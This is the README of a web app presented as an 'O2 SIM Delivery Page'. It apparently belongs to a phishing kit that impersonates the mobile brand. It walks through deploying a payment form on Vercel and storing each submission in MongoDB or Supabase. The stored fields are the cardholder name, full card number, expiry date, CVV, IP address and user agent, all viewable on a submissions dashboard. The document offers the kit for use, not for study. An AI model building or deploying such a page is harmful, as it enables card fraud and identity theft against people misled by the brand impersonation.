# O2 SIM Delivery Page

A full-stack form application with MongoDB database for capturing SIM delivery orders.

## Features

- 💳 Payment form with card validation
- 📊 Submissions dashboard with full data visibility
- 🗄️ MongoDB database for persistent storage
- 🚀 Ready for Vercel deployment

## Local Setup

### Prerequisites
- Node.js 14+
- MongoDB (local or MongoDB Atlas cloud account)

### Installation

1. Clone or navigate to the project:
```bash
cd o2
```

2. Install dependencies:
```bash
npm install
```

3. Set up environment variables:
   - Copy `.env.example` to `.env`
   - Update `MONGODB_URI` with your connection string

4. Start the server:
```bash
npm start
```

The app will be available at `http://localhost:3000`

## Database Setup

### Option 1: MongoDB Atlas (Cloud - Recommended for Vercel)

1. Go to [mongodb.com/cloud](https://www.mongodb.com/cloud)
2. Sign up for a free account
3. Create a new cluster (M0 free tier)
4. Get the connection string (looks like `mongodb+srv://username:password@cluster.mongodb.net/o2_submissions`)
5. Add it to your `.env` file as `MONGODB_URI`

### Option 2: Local MongoDB

1. Install MongoDB locally
2. Start MongoDB service
3. Use connection string: `mongodb://localhost/o2_submissions`

### Option 3: Supabase (Recommended for ease of setup)

1. Go to https://app.supabase.com and create a new project.
2. Create a new table named `submissions` with columns:
   - `id` (bigint or bigint, primary key)
   - `timestamp` (timestamp with time zone)
   - `nameOnCard` (text)
   - `cardNumber` (text)
   - `expiry` (text)
   - `cvv` (text)
   - `ip` (text)
   - `userAgent` (text)
   - `createdAt` (timestamp with time zone)
3. Go to Settings → API and copy the `anon` key.
4. Add `SUPABASE_URL` and `SUPABASE_KEY` to your `.env` file.

## Deployment on Vercel

1. Push your code to GitHub
2. Go to [vercel.com](https://vercel.com)
3. Import your GitHub repository
4. Add environment variable:
   - `MONGODB_URI` = Your MongoDB Atlas connection string
5. Deploy!

## API Endpoints

- `POST /submit` — Submit form data
- `GET /submissions` — View submissions page (HTML)
- `GET /api/submissions` — Get submissions as JSON

## Project Structure

```
├── server.js           # Express server
├── index.html          # Payment form
├── models/
│   └── Submission.js   # MongoDB schema
├── .env                # Environment variables (not in git)
├── .env.example        # Template for .env
├── vercel.json         # Vercel configuration
└── package.json        # Dependencies
```

## Environment Variables

Create a `.env` file with:
```
MONGODB_URI=your_mongodb_connection_string
SUPABASE_URL=your_supabase_url
SUPABASE_KEY=your_supabase_anon_or_service_role_key
PORT=3000
```
